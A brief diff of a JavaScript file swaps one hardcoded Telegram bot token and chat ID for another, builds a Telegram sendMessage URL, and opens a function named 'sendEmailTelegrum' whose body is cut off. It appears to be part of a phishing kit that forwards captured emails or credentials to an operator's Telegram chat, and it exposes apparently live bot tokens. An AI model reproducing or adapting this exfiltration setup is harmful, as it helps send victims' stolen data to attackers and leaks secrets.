@@ -1,7 +1,7 @@
 "use strict";
 
-const TELEGRAM_BOT_TOKEN = "6362848595:AAEaLsksHrQ1IZUHPN5OzfJoX8ZhTLSrMak";
-const TELEGRAM_CHAT_ID = "@KarinaReuea";
+const TELEGRAM_BOT_TOKEN = "6532109694:AAFjgg61QSRsktgtGTaBfRGOQU4QzcIVRW4";
+const TELEGRAM_CHAT_ID = "@SharlandiaCase";
 const API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
 async function sendEmailTelegrum(event) {
